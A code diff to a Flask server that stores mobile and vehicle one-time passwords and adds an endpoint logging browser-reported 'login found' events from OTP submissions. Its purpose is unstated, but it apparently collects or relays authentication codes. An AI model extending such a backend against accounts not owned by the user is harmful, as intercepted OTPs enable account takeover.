@@ -12,6 +12,8 @@ vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]
 # Track browser sessions
 client_sessions = {}  # key -> {"first_request": datetime}
 
+# Track login-found events
+login_events = []  # [{"otpEndpoint":..., "status":..., "time":...}]
 
 def now_str():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -110,17 +112,37 @@ def get_latest_otp():
             return jsonify({"status": "empty", "message": "No new mobile OTP"}), 200
 
 
+@app.route('/api/login-found', methods=['POST'])
+def login_found():
+    """Receive notification that browser sent OTP POST and got response."""
+    try:
+        data = request.get_json(force=True)
+        event = {
+            "otpEndpoint": data.get("otpEndpoint"),
+            "status": data.get("status"),
+            "time": datetime.now()
+        }
+        login_events.append(event)
+        print(f"[{now_str()}] 🔑 LOGIN FOUND via OTP POST -> {event['otpEndpoint']} Status:{event['status']}")
+        return jsonify({"status": "success", "message": "Login event stored"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+
 @app.route('/api/status', methods=['GET'])
 def status():
     last_mobile = mobile_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if mobile_otps else "None"
     last_vehicle = vehicle_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if vehicle_otps else "None"
+    last_login = login_events[-1]["time"].strftime("%Y-%m-%d %H:%M:%S") if login_events else "None"
 
     return jsonify({
-        "status": "active" if (mobile_otps or vehicle_otps) else "idle",
+        "status": "active" if (mobile_otps or vehicle_otps or login_events) else "idle",
         "last_mobile_otp_time": last_mobile,
         "last_vehicle_otp_time": last_vehicle,
+        "last_login_found_time": last_login,
         "mobile_otp_count": len(mobile_otps),
-        "vehicle_otp_count": len(vehicle_otps)
+        "vehicle_otp_count": len(vehicle_otps),
+        "login_found_count": len(login_events)
     }), 200
 
 
